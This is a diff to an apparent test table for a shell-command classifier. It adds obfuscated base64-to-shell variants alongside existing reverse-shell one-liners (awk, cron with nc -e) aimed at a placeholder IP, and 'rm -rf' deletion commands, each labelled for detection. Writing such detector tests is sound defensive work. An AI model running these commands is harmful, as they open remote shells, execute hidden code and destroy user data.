@@ -208,6 +208,10 @@ const BAD: Array<[string, string]> = [
   ["awk 'BEGIN{s=\"/inet/tcp/0/192.0.2.1/4444\";while(1){s|&getline c;print|&s}}'", "reverseShell"],
   ["echo '* * * * * nc -e /bin/sh 192.0.2.1 4444' | crontab -", "reverseShell"],
   ["echo c3VkbyBpZA== | base64 -d | sh", "unclear"],
+  // Into a subshell, or with its errors too (`|&`).
+  ["echo c3VkbyBpZA== | base64 -d | (/bin/sh)", "unclear"],
+  ["echo c3VkbyBpZA== | base64 -d |(/bin/bash)", "unclear"],
+  ["echo c3VkbyBpZA== | base64 -d |&/bin/sh", "unclear"],
   ['eval "$(echo c3VkbyBpZA== | base64 -d)"', "unclear"],
   ["rm -rf /home/ada", "destroy"],
   ["rm -rf ../..", "destroy"],
